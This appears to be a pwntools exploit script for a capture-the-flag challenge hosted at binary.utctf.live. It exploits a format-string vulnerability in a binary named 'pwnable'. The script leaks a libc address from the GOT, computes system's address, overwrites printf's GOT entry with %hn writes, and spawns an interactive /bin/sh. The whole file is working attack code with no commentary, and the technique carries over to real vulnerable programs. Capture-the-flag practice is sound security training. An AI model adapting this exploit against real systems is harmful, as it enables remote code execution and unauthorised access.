#!/usr/bin/env python

from pwn import *  # pylint: disable=unused-wildcard-import
import os, sys

context(arch="amd64")

HOST="binary.utctf.live"
PORT=9003
REMOTE_LIBC="libc-2.23.so"

BINARY="./pwnable"
LOCAL_LIBC=os.environ['LIBC'] if 'LIBC' in os.environ else "/lib/x86_64-linux-gnu/libc.so.6"

if "remote" in sys.argv:
    p = remote(HOST, PORT)
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass
else:
    p = process(BINARY)
    libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-v']  # pylint: disable=assigning-non-slot
    gdb.attach(p, "b *0x400767")  # pylint: disable=undefined-variable

########################################################

# overwrite printf with one_gadget
# invalid instruction is fstr

def exploit():
    log.info("wuddup")

    for _ in range(4):
        p.recvline()

    printf = elf.got['printf']
    log.info("dest got: " + hex(printf))

    # leak libc
    payload = ""
    payload += "%7$s"
    payload += "aaaa"
    payload += p64(elf.got['puts'])

    p.sendline(payload)

    libc_leak = u64(p.recv(6).ljust(8, '\x00'))
    log.info("printf leak: " + hex(libc_leak))
    libc_base = libc_leak - libc.symbols['puts']
    log.info("libc base: " + hex(libc_base))

    tgt = libc.symbols['system']
    goal = libc_base + tgt
    goal_l = goal & 0xffff
    goal_h = goal >> 16 & 0xffff
    log.info("goal l: " + hex(goal_l))
    log.info("goal h: " + hex(goal_h))

    assert(goal_h > goal_l)
    pause()

    payload = ""
    payload += "%{}d".format(goal_l)
    payload += "%10$hn"
    payload += "%{}d".format(goal_h-goal_l)
    payload += "%11$hn"
    payload += "a"*(32-len(payload))
    payload += p64(printf)
    payload += p64(printf+2)

    log.info("payload (len: {}): {}".format(len(payload), payload))
    assert(len(payload) < 50)

    p.sendline(payload)
    p.sendline("/bin/sh")
    p.interactive()

########################################################

if __name__ == "__main__":
    exploit()
